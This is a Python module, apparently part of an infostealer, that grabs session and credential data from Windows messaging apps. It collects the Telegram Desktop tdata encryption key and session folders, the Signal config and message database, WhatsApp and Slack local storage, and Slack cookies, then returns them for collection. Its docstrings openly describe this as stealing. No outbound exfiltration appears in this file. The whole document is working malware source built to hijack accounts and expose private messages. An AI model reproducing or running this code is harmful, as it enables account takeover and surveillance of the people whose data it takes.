# modules/messaging_stealer.py - Enhanced Telegram, Signal, WhatsApp, Slack

import os
import shutil
from pathlib import Path
from config import ROAMING, log

def is_hex_string(s):
    """Check if string is valid hex"""
    try:
        int(s, 16)
        return True
    except ValueError:
        return False

def get_telegram_data():
    """
    Enhanced Telegram Desktop tdata extraction
    Grabs key_datas and all session folders
    """
    log("Grabbing Telegram data...")
    
    telegram_path = Path(ROAMING) / 'Telegram Desktop' / 'tdata'
    
    if not telegram_path.exists():
        log("Telegram not found")
        return None
    
    telegram_files = []
    
    try:
        # Grab key_datas (encryption key)
        key_datas = telegram_path / 'key_datas'
        if key_datas.exists():
            try:
                with open(key_datas, 'rb') as f:
                    telegram_files.append({
                        'name': 'key_datas',
                        'path': 'key_datas',
                        'data': f.read()
                    })
                log("Grabbed key_datas")
            except:
                pass
        
        # Grab settings and usertag
        for filename in ['settings', 'usertag']:
            file_path = telegram_path / filename
            if file_path.exists():
                try:
                    with open(file_path, 'rb') as f:
                        telegram_files.append({
                            'name': filename,
                            'path': filename,
                            'data': f.read()
                        })
                    log(f"Grabbed {filename}")
                except:
                    pass
        
        # Grab hex-named session folders (16 char hex = session data)
        for item in telegram_path.iterdir():
            if item.is_dir() and len(item.name) == 16 and is_hex_string(item.name):
                log(f"Found session folder: {item.name}")
                
                # Grab all map files from session folder
                for map_file in item.glob('map*'):
                    try:
                        with open(map_file, 'rb') as f:
                            rel_path = f"{item.name}/{map_file.name}"
                            telegram_files.append({
                                'name': map_file.name,
                                'path': rel_path,
                                'data': f.read()
                            })
                        log(f"Grabbed {rel_path}")
                    except:
                        pass
                
                # Also grab numbered files (like 0, 1, 2, etc)
                for session_file in item.iterdir():
                    if session_file.is_file() and session_file.name.isdigit():
                        try:
                            with open(session_file, 'rb') as f:
                                rel_path = f"{item.name}/{session_file.name}"
                                telegram_files.append({
                                    'name': session_file.name,
                                    'path': rel_path,
                                    'data': f.read()
                                })
                        except:
                            pass
        
        # Grab D877F783D5D3EF8C folders (main data folders)
        for item in telegram_path.iterdir():
            if item.is_dir() and item.name.startswith('D877F783D5D3EF8C'):
                for file in item.rglob('*'):
                    if file.is_file():
                        try:
                            # Skip very large files
                            if file.stat().st_size > 50 * 1024 * 1024:
                                continue
                            
                            with open(file, 'rb') as f:
                                rel_path = str(file.relative_to(telegram_path))
                                telegram_files.append({
                                    'name': file.name,
                                    'path': rel_path,
                                    'data': f.read()
                                })
                        except:
                            pass
        
        log(f"Grabbed {len(telegram_files)} Telegram files")
        return telegram_files
    
    except Exception as e:
        log(f"Telegram extraction failed: {e}")
        return None

def get_signal_data():
    """Steal Signal Desktop session data"""
    log("Grabbing Signal data...")
    
    signal_path = Path(ROAMING) / 'Signal'
    
    if not signal_path.exists():
        log("Signal not found")
        return None
    
    signal_files = []
    
    # Config file
    config_path = signal_path / 'config.json'
    if config_path.exists():
        try:
            with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                signal_files.append({
                    'name': 'config.json',
                    'path': 'config.json',
                    'data': f.read()
                })
        except:
            pass
    
    # Database
    db_path = signal_path / 'sql' / 'db.sqlite'
    if db_path.exists():
        try:
            with open(db_path, 'rb') as f:
                signal_files.append({
                    'name': 'db.sqlite',
                    'path': 'sql/db.sqlite',
                    'data': f.read()
                })
        except:
            pass
    
    # Attachments metadata
    attachments_path = signal_path / 'attachments.noindex'
    if attachments_path.exists():
        try:
            for file in attachments_path.rglob('*'):
                if file.is_file() and file.suffix in ['.json', '.db']:
                    try:
                        with open(file, 'rb') as f:
                            relative_path = file.relative_to(signal_path)
                            signal_files.append({
                                'name': file.name,
                                'path': str(relative_path),
                                'data': f.read()
                            })
                    except:
                        pass
        except:
            pass
    
    log(f"Grabbed {len(signal_files)} Signal files")
    return signal_files if signal_files else None

def get_whatsapp_data():
    """Steal WhatsApp Desktop session tokens"""
    log("Grabbing WhatsApp data...")
    
    whatsapp_path = Path(ROAMING) / 'WhatsApp' / 'Local Storage' / 'leveldb'
    
    if not whatsapp_path.exists():
        log("WhatsApp not found")
        return None
    
    whatsapp_files = []
    
    try:
        for file in whatsapp_path.glob('*'):
            if file.is_file() and file.suffix in ['.log', '.ldb']:
                try:
                    with open(file, 'rb') as f:
                        whatsapp_files.append({
                            'name': file.name,
                            'path': file.name,
                            'data': f.read()
                        })
                except:
                    pass
        
        log(f"Grabbed {len(whatsapp_files)} WhatsApp files")
        return whatsapp_files if whatsapp_files else None
    
    except Exception as e:
        log(f"WhatsApp extraction failed: {e}")
        return None

def get_slack_data():
    """Steal Slack workspace tokens"""
    log("Grabbing Slack data...")
    
    slack_path = Path(ROAMING) / 'Slack' / 'Local Storage' / 'leveldb'
    
    if not slack_path.exists():
        log("Slack not found")
        return None
    
    slack_files = []
    
    try:
        for file in slack_path.glob('*'):
            if file.is_file() and file.suffix in ['.log', '.ldb']:
                try:
                    with open(file, 'rb') as f:
                        slack_files.append({
                            'name': file.name,
                            'path': file.name,
                            'data': f.read()
                        })
                except:
                    pass
        
        # Also grab Cookies
        cookies_path = Path(ROAMING) / 'Slack' / 'Cookies'
        if cookies_path.exists():
            try:
                with open(cookies_path, 'rb') as f:
                    slack_files.append({
                        'name': 'Cookies',
                        'path': 'Cookies',
                        'data': f.read()
                    })
            except:
                pass
        
        log(f"Grabbed {len(slack_files)} Slack files")
        return slack_files if slack_files else None
    
    except Exception as e:
        log(f"Slack extraction failed: {e}")
        return None

def grab():
    """Main function to gather all messaging app data"""
    log("Gathering messaging app data...")
    
    return {
        'telegram': get_telegram_data(),
        'signal': get_signal_data(),
        'whatsapp': get_whatsapp_data(),
        'slack': get_slack_data()
    }